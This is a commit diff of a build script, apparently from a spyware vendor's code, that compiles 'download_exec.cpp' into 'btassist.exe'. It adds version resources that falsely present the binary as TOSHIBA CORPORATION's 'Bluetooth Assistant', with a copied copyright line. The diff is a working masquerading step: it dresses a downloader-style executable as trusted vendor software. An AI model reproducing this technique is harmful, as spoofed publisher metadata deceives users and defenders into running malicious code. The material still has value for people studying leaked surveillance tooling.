4a94502617d6d13f063bd8997d2bb62b6642040d
Daniele Milan <d.milan@hackingteam.com>
2012-07-31 13:06:41 +0200

    Added version information.

--- build.bat
+++ build.bat
@@ -1,2 +1,10 @@
 cl.exe download_exec.cpp /Febtassist.exe
-rcedit /I btassist.exe bt.ico
+rcedit /I btassist.exe bt.ico  
+
+set VERSION="7.0.0.0 (1)"
+set FILEDESCR=/s desc "Bluetooth Assistant"
+set BUILDINFO=/s pb ""
+set COMPINFO=/s company "TOSHIBA CORPORATION" /s (c) "Copyright (C) 2009 TOSHIBA CORPORATION, All rights reserved."
+set PRODINFO=/s product "Bluetooth Assistant" /pv "7.0.0.0"
+
+verpatch /va btassist.exe %VERSION% %FILEDESCR% %COMPINFO% %PRODINFO% %BUILDINFO%
